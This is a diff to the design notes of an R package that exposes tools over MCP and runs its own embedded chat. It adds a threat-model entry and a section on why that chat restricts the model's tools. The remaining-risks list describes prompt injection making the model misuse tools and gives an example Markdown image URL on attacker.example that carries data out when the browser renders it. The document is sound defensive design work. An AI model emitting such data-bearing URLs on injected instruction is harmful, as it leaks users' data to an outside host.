@@ -499,6 +499,38 @@ kept away.
 | Unauthorised access to an HTTP server | Authentication following the MCP authorization specification (OAuth 2.1), or a reverse proxy in front of the server. |
 | No traceability | Audit log of every call (below). |
 | Secrets exposed to the model | Secrets come from environment variables or config, never from tool arguments or results. |
+| Exfiltration through the chat UI | The embedded chat does not load remote images or other remote content from model output (see below). |
+
+### Why the embedded chat is different, and where it can still leak
+
+In Claude Code or Codex, we configure someone else's product, which ships
+its own tools and reads other configuration sources: we can only remove
+what its vendor lets us remove. In the embedded chat, **mordew is the
+client**. Our R code (ellmer) calls the model API and sets the tool list
+sent with every request:
+
+- A model called through an API has no tools by default: no shell, no
+  files. It can only request the tools declared in the request, here the
+  mordew registry.
+- Tools run in the client's code. A tool the model invents has no
+  function behind it.
+- Tools hosted by the model provider (web search, code execution) are
+  only enabled if the request asks for them, and mordew does not.
+- Users cannot add connectors or MCP servers, and the system prompt is
+  ours.
+
+Three risks remain:
+
+1. Tool results still go to the model provider.
+2. Prompt injection through the data can still make the model misuse our
+   own tools, hence argument validation and limits on the server side.
+3. **The chat UI itself can leak data.** If it renders Markdown images, an
+   injected instruction can make the model write an image whose URL
+   carries data (`![](https://attacker.example/?d=...)`), and the browser
+   sends it when loading the image. The embedded chat must not load
+   remote images or other remote resources from model output: render
+   images as plain links or drop them, and set a Content Security Policy
+   that only allows the app's own origin.
 
 ### Audit log
 
@@ -734,6 +766,7 @@ Shiny projects.
 - [ ] `run_mcp_server()` for stdio and HTTP, on top of mcptools
 - [ ] Spike: asynchronous HTTP front (handler returning a promise, tools in mirai workers) to validate architecture B early
 - [ ] `run_chat()`: multi-user shinychat app connected to the server
+- [ ] Chat UI hardening: no remote images or resources from model output, Content Security Policy
 - [ ] `run()`: server in the background, then the chat
 - [ ] `mcp_client_config()` for Claude Desktop, Claude Code, Codex CLI, Gemini CLI and VS Code: the most restricted configuration each client allows, with a warning when the restriction is partial
 - [ ] Re-check client restriction options before each release: they change quickly
